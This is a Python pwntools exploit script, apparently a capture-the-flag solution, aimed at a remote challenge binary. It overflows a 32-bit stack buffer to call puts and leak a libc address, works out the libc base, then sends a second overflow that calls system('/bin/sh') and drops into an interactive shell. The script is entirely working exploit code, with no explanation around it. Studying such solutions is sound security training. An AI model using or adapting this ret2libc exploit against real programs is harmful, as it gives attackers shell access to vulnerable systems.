from pwn import *

context.log_level="debug"

r=remote("pwn.sixstars.team",23613)
#r=process("./chall")

elf=ELF("./chall")
libc=ELF("./libc.so.6")

r.recv()

sh_addr=list(libc.search("/bin/sh"))[0]
puts_p=elf.sym["puts"]
puts_addr=libc.sym["puts"]
exeve=libc.sym["system"]

sh1='a'*0x18+'a'*0x4+p32(puts_p)+p32(0x0804854A)+p32(0x0804a014)
r.send(sh1)
r.recvline()
s=r.recv(4)
base=u32(s)-puts_addr
print hex(base)

real_exe=base+exeve
print hex(real_exe)
real_sh=base+sh_addr
print hex(real_sh)

sh='a'*0x18+'a'*0x4+p32(real_exe)+p32(0)+p32(real_sh)

#print r.pid
#pause()

r.recv()
r.sendline(sh)
r.interactive()

